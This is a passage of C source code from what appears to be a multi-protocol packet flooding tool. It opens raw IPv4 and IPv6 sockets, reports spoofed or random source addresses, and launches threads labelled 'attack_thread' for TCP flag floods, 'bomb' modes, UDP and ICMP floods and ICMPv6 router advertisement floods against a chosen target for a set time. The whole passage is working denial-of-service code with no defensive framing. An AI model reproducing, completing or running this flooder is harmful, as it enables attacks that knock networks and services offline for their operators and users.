if ( (thread_data_array[i].socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
perror("socket");
exit(-1);
}
}
if (thread_data_array[i].a_flags != UDP_BMB) {
if (setsockopt(thread_data_array[i].socket, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) < 0) {
perror("setsockopt");
exit(-1);
}
}
}
}
printf("[IPv4] Packeting (%s) from (%s) with flags (%i) for (%i) seconds.\n\n", thread_data_array[0].dst_class != NULL ? thread_data_array[0].dst_class :inet_ntop(AF_INET,&thread_data_array[0].destination4.sin_addr,thread_data_array[0].DestIP4, sizeof(thread_data_array[0].DestIP4)),thread_data_array[0].src_class != NULL ? thread_data_array[0].src_class :"random",thread_data_array[0].a_flags, thread_data_array[0].timeout);
printf("[FLAGS] (%d)\n\n", thread_data_array[0].a_flags);
}
else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1) {
int i;
for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2) {
if ( thread_data_array[i].initialized== 1 ) {
if (thread_data_array[i].a_flags <= TCP_BMB || thread_data_array[i].a_flags == RAW_BMB) {
if ( (thread_data_array[i].socket = socket(AF_INET6, SOCK_RAW, IPPROTO_TCP)) < 0) {
perror("socket");
exit(-1);
}
}
else if (thread_data_array[i].a_flags == UDP_BMB || thread_data_array[i].a_flags == UDP_CFF)
{
if ( (thread_data_array[i].socket = socket(AF_INET6, SOCK_RAW, IPPROTO_UDP)) < 0) {
perror("socket");
exit(-1);
}
}
else if (thread_data_array[i].a_flags == ICMP_ECHO_G) {
if ( (thread_data_array[i].socket = socket(AF_INET6, SOCK_RAW, IPPROTO_ICMPV6)) < 0) {
perror("socket");
exit(-1);
}
}
if (thread_data_array[i].a_flags != UDP_BMB) {
if (setsockopt(thread_data_array[i].socket, IPPROTO_IPV6, IPV6_TCLASS, (char *)&on, sizeof(on)) < 0) {
perror("setsockopt");
exit(-1);
}
}
}
}
printf("[IPv6] Packeting (%s) from (%s) with flags (%i) for (%i) seconds.\n\n", thread_data_array[0].dst_class != NULL ? thread_data_array[0].dst_class : inet_ntop(AF_INET6,&thread_data_array[0].destination6.sin6_addr,thread_data_array[0].DestIP6, sizeof(thread_data_array[0].DestIP6)),thread_data_array[0].src_class,thread_data_array[0].a_flags,thread_data_array[0].timeout);
printf("[FLAGS] (%d)\n\n", thread_data_array[0].a_flags);
}
signal (SIGINT, handle_exit);
signal (SIGTERM, handle_exit);
signal (SIGQUIT, handle_exit);
thread_data_array[0].start = time(NULL);
for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2) {
if (thread_data_array[i].a_flags == TCP_FIN) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_FIN;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_SYN) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_SYN;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_RST) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_RST;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_PSH) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_PUSH;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
{
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_ACK) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_ACK;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
{
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_URG) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_URG;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
{
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_ECE) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_SYN;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
{
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_CWR) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_SYN;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
{
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_NOF) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_NOF;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
{
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_FRG) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
thread_data_array[i].th_flags = TH_NOF;
if(pthread_create(&attack_thread[i], NULL, &send_tcp, (void *)&thread_data_array[i]) != 0)
{
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == TCP_BMB) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
if(pthread_create(&attack_thread[i], NULL, &send_bomb, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == UDP_BMB) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
if(pthread_create(&attack_thread[i], NULL, &send_bomb, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == RAW_BMB) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
if(pthread_create(&attack_thread[i], NULL, &send_bomb, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == UDP_CFF) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
if(pthread_create(&attack_thread[i], NULL, &send_udp, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == ICMP_ECHO_G) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
if(pthread_create(&attack_thread[i], NULL, &send_icmp, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
if (thread_data_array[i].a_flags == ICMP6_ROUTERADV) {
thread_data_array[i].thread = i;
thread_data_array[i].packets = 0;
if(pthread_create(&attack_thread[i], NULL, &send_icmp_ra, (void *)&thread_data_array[i]) != 0) {
printf("+ Thread error:\n");
perror("- pthread_create()\n");
}
}
}
for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2) {
if(attack_thread[i] != 0)
pthread_join(attack_thread[i], NULL);
}
exit(0);
}
